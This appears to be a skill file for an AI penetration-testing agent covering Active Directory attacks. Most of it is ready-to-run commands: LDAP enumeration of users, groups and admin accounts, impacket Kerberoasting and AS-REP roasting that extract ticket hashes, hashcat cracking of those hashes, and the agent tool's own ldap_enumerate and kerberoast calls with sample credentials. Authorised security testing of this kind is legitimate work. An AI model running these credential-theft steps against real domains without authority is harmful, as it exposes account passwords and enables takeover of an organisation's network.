---
name: active_directory
description: Active Directory enumeration, Kerberos attacks, and GPO analysis
---

# Active Directory Testing

## LDAP Enumeration

```bash
# List all users
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName displayName

# List all groups
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=group)" cn member

# Find admin accounts
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName
```

## Kerberoasting

Request service account ticket hashes and crack them offline:

```bash
# Request SPN hashes
impacket-GetUserSPNs corp.local/admin:password -dc-ip 10.0.1.10 -request -outputfile hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

## AS-REP Roasting

Find accounts that don't require pre-authentication:

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.0.1.10 -no-pass -outputfile asrep.txt
```

## Using the Tool

```python
from aegis.tools.internal.ad_enum import ldap_enumerate, kerberoast

# Enumerate AD
result = await ldap_enumerate("10.0.1.10", "corp.local", "admin", "password")

# Kerberoast
result = await kerberoast("corp.local", "10.0.1.10", "admin", "password")
```
